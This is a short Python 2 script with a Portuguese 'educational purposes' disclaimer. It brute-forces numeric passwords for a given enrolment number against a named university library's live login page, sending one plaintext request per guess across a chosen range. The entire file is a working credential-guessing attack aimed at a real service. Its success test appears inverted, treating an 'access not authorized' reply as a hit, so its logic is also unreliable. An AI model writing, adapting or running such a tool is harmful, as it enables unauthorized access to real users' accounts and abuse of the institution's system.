import urllib2
__author__      = "Davi Wesley"
__email__ = "davi.wesley@icloud.com"
'''
Esse programa foi feito para fins educativos, qualquer dano
é de responsabilidade total do usuário
'''
def main():
  inscricao = int(input("Digite sua incrição: "))
  inicio = int(input("Digite o inicio do intervalo: "))
  fim = int(input("Digite o final do intervalo: "))
  for i in range(inicio, fim):
      url = "http://bibweb.npd.ufc.br/pergamum/biblioteca_s/php/login_usu.php?flag=index.php&login=" + str(inscricao)+"&password=" + str(i) + "&button=Acessar&numero_mestre="
      webUrl=urllib2.urlopen(url)
      data=webUrl.read()
      if data == "Acesso não autorizado!":
          print "SENHA ENCONTRADA= " + str(i)
          break
      else:
          print "SENHA NAO ENCONTRADA" + str(i)
if __name__ == "__main__":
  main()
